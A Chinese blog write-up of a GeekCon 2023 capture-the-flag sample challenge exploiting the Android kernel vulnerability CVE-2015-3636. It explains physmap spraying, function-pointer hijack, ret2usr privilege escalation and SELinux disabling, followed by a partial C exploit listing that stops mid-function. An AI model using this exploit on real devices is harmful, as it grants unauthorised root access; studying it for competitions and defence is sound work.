<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/leaf-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/leaf-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="Geekcon 2023 AVSS挑战赛的说明文档中，用 CVE-2015-3636 这个漏洞作为示例，展示了同一个漏洞在不同环境中（android 5&#x2F;7&#x2F;11）进行利用所面临的挑战。（没想到又碰到了这个漏洞hhh">
<meta property="og:type" content="article">
<meta property="og:title" content="GeekCon AVSS 2023 初赛示例题 CVE-2015-3636">
<meta property="og:url" content="http://blingblingxuanxuan.github.io/2023/09/03/230903-geekcon-prepare/index.html">
<meta property="og:site_name" content="blingbling&#39;s blog">
<meta property="og:description" content="Geekcon 2023 AVSS挑战赛的说明文档中，用 CVE-2015-3636 这个漏洞作为示例，展示了同一个漏洞在不同环境中（android 5&#x2F;7&#x2F;11）进行利用所面临的挑战。（没想到又碰到了这个漏洞hhh">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/09/03/230903-geekcon-prepare/image-20230903213052902.png?size=600">
<meta property="article:published_time" content="2023-09-03T11:44:33.000Z">
<meta property="article:modified_time" content="2023-11-19T19:35:06.816Z">
<meta property="article:author" content="blingbling">
<meta property="article:tag" content="kernel pwn">
<meta property="article:tag" content="android">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://blingblingxuanxuan.github.io/2023/09/03/230903-geekcon-prepare/image-20230903213052902.png?size=600"><title>GeekCon AVSS 2023 初赛示例题 CVE-2015-3636 | blingbling's blog</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2023/09/03/230903-geekcon-prepare/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"80px","tocMaxDepth":3},
  header: {"enable":true,"showOnPost":false,"scrollDownIcon":true},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: true,
  zoomImage: undefined,
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">关于</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friends/"><span class="header-nav-menu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">GeekCon AVSS 2023 初赛示例题 CVE-2015-3636</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-09-03</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-20</span></span></div></header><div class="post-body"><p>Geekcon 2023 AVSS挑战赛的<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://geekcon.darknavy.com/2023/china/doc/AVSS-sample-explanation-v1.0-cn.pdf" >说明文档</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>中，用 CVE-2015-3636 这个漏洞作为示例，展示了同一个漏洞在不同环境中（android 5/7/11）进行利用所面临的挑战。文档中有题目环境的下载方式。</p>

        <h1 id="android-5-1环境下3636的利用"   >
          <a href="#android-5-1环境下3636的利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#android-5-1环境下3636的利用" class="headerlink" title="android 5.1环境下3636的利用"></a>android 5.1环境下3636的利用</h1>
      
        <h2 id="基本信息"   >
          <a href="#基本信息" class="heading-link"><i class="fas fa-link"></i></a><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2>
      <p>架构：arm32</p>
<p>linux版本：3.4.67</p>
<p>防护措施：开启selinux，未开启PXN，PAN，KASLR</p>

        <h2 id="漏洞分析"   >
          <a href="#漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2>
      <p>在<a href="https://blingblingxuanxuan.github.io/2022/09/21/cve-2015-3636-52pojie-version/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">之前的文章</a>中有过详细分析，这里不再重复。</p>

        <h2 id="漏洞利用"   >
          <a href="#漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2>
      
        <h3 id="控制流劫持-physmap-spray"   >
          <a href="#控制流劫持-physmap-spray" class="heading-link"><i class="fas fa-link"></i></a><a href="#控制流劫持-physmap-spray" class="headerlink" title="控制流劫持 - physmap spray"></a>控制流劫持 - physmap spray</h3>
      <p>physmap spray分两步：</p>
<ul>
<li>喷UAF sock</li>
<li>喷mmap</li>
</ul>
<p>最终，两者都会出现在physmap区域，并且有一定的概率某些sock会跟mmap内存重合。</p>
<ol>
<li>第一次尝试（失败）<ul>
<li>喷4096个 UAF sock</li>
<li>mmap最大的空间并填充，最后搜索哪个sock被覆盖到</li>
</ul>
</li>
<li>第二次尝试（成功）<ul>
<li>先喷4096个 UAF sock</li>
<li>每mmap一次就搜索一次，直到mmap到最大空间。munmap所有空间，然后再重复mmap过程。直到找到合适的vuln sock。</li>
</ul>
</li>
<li>第三次尝试（成功）<ul>
<li>分散vuln sock，子进程喷1000个sock，父进程喷一个sock，几个来回后，先正常释放子进程的sock，然后触发漏洞使父进程产生vuln sock。</li>
<li>mmap前先确定空间够用，每mmap一次就搜索一次，直到mmap到最大空间。munmap所有空间，然后再重复mmap过程。直到找到合适的vuln sock。</li>
</ul>
</li>
</ol>
<p>所以，后两种方法都可以达成目的，都是结合原作者的exp改出来的，不知道为什么第一种方法在32位下就是不成功。</p>
<p>以第3种方法为例，重点记录一下父子进程搭配创建sock部分的代码逻辑</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 父进程读到1，表示子进程已创建好&#96;PADDING_SOCK_NUM&#96;个sock fd</span><br><span class="line">- 子进程读到2，表示父进程已申请完sock fd，子进程可以继续创建下一轮sock fd</span><br><span class="line">- 父进程读到3，表示子进程已创建完4000个sock fd，父进程需要新起一个子进程继续创建padding sock fd</span><br></pre></td></tr></table></div></figure>
<p>找到合适的vuln sock之后，只需 <code>close(vuln_sock)</code> 即可触发 <code>inet_relase()</code> 中对 <code>struct sock</code> 中 <code>sk-&gt;sk_prot-&gt;close</code> 函数指针的调用。所以提前将该sock的内容填充好，即可达成控制流劫持。</p>
<p>需要注意在控制流劫持前， <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.4.50/C/ident/ip_mc_drop_socket" >ip_mc_drop_socket()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 函数中会访问 <code>inet-&gt;mc_list</code> ，需要提前将该内容置0，防止崩溃。以后在利用时也需要细心注意。</p>

        <h3 id="get-root-shell-ret2usr"   >
          <a href="#get-root-shell-ret2usr" class="heading-link"><i class="fas fa-link"></i></a><a href="#get-root-shell-ret2usr" class="headerlink" title="get root shell - ret2usr"></a>get root shell - ret2usr</h3>
      <p>由于本题未开启PAN PXN KASLR等防护措施，所以到这一步就简单了。控制了函数指针后，直接ret2usr执行完 <code>commit_creds(prepare_kernel_cred(0))</code> 即可完成提权，当然还要注意关闭selinux。通过 <code>sel_read_enforce()</code> 函数找到 <code>selinux_enforcing</code> 的地址，将其改成0即可关闭selinux。最后正常返回到用户态执行 <code>execl(&quot;/system/bin/sh&quot;, &quot;sh&quot;, NULL);</code> 即可获得root shell。</p>

        <h3 id="完整exp"   >
          <a href="#完整exp" class="heading-link"><i class="fas fa-link"></i></a><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sysinfo.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_VUL_SOCKS_NUM 200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSEC_PER_SEC 1000000000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ONE_CHILD_SOCK_NUM 4000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PADDING_SOCK_NUM 1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_CHILD_NUM 10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ONE_MMAP_SIZE 2*1024*1024</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_MMAP_NUM 1024</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIOCGSTAMPNS 0x8907</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> SIOCGSTAMPNS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIOCGSTAMPNS 0x8907</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* SIOCGSTAMPNS */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TIMESTAMP_MAGIC 0x0db4da5f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_STAMP_OFFSET 0x118</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MEM_RESERVE_SIZE 64*1024*1024</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> vuln_sock[MAX_VUL_SOCKS_NUM];</span><br><span class="line"><span class="keyword">int</span> vuln_sock_count;</span><br><span class="line"><span class="keyword">unsigned</span> vuln_sock_addr;</span><br><span class="line"><span class="keyword">unsigned</span> vuln_sock_index;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa1</span>,<span class="title">sa2</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maximize_fd_limit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim</span>;</span></span><br><span class="line">    getrlimit(RLIMIT_NOFILE, &amp;rlim);</span><br><span class="line"></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max;</span><br><span class="line">    setrlimit(RLIMIT_NOFILE, &amp;rlim);</span><br><span class="line"></span><br><span class="line">    getrlimit(RLIMIT_NOFILE, &amp;rlim);</span><br><span class="line">    <span class="keyword">return</span> rlim.rlim_cur;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mmap_200200</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* address = mmap((<span class="keyword">void</span>*)<span class="number">0x200000</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_SHARED| MAP_FIXED |MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(address == MAP_FAILED)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;map failed!\\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(address,<span class="number">0x90</span>,<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">int</span> ret = mlock(address, <span class="number">0x1000</span>); </span><br><span class="line">    <span class="keyword">if</span>(ret !=<span class="number">0</span> )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;mlock error in mmap_200200\\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap 0x200000~0x201000, avoid crash.\\n&quot;</span>);     </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_child_task</span><span class="params">(<span class="keyword">int</span> read_fd, <span class="keyword">int</span> write_fd, <span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,ret;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> child_sock[ONE_CHILD_SOCK_NUM];</span><br><span class="line"></span><br><span class="line"><span class="comment">// close other fds</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">3</span>; i&lt;<span class="number">4096</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i == read_fd || i == write_fd) <span class="keyword">continue</span>;</span><br><span class="line">        ret = close(i);</span><br><span class="line">        <span class="keyword">if</span>(ret != <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">// printf(&quot;[child %d] error close fd %d\\n&quot;,num,i);</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// every 1000 socks notice parent once</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    sa.sin_family = AF_INET;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;ONE_CHILD_SOCK_NUM; i+=PADDING_SOCK_NUM)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;PADDING_SOCK_NUM; j++)&#123;</span><br><span class="line">            child_sock[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);</span><br><span class="line">            ret = connect(child_sock[i], (<span class="keyword">const</span> struct sockaddr *) &amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">            <span class="keyword">if</span>(ret != <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;child %d connect failed! index: %d\\n&quot;</span>, num, i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// sync to parent</span></span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">        write(write_fd, &amp;result, <span class="keyword">sizeof</span>(result));</span><br><span class="line"></span><br><span class="line">        read(read_fd, &amp;result, <span class="keyword">sizeof</span>(result));</span><br><span class="line">        <span class="keyword">if</span>(result == <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[child %d] stop creating sock\\n&quot;</span>,num);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    result = <span class="number">3</span>;</span><br><span class="line">    write(write_fd, &amp;result, <span class="keyword">sizeof</span>(result));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        sleep(<span class="number">30</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_vuln_socks</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipe_fd1[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> pipe_fd2[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> read_fd, write_fd;</span><br><span class="line">    <span class="keyword">int</span> child_pid[MAX_CHILD_NUM];</span><br><span class="line">    <span class="keyword">int</span> i,j,k,ret;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [-] malloc socks start\\n&quot;</span>);</span><br><span class="line"><span class="comment">// (1000 padding sock + 1 vuln sock)*n</span></span><br><span class="line">    signal(SIGCHLD, SIG_IGN);       <span class="comment">// avoid child process becomes zombie</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;MAX_CHILD_NUM; i++)&#123;</span><br><span class="line">        pipe(pipe_fd1);                 <span class="comment">// p:read c:write</span></span><br><span class="line">        pipe(pipe_fd2);                 <span class="comment">// p:write c:read</span></span><br><span class="line"></span><br><span class="line">        child_pid[i] = fork();</span><br><span class="line">        <span class="keyword">if</span>(child_pid[i] == <span class="number">0</span>)&#123;</span><br><span class="line">            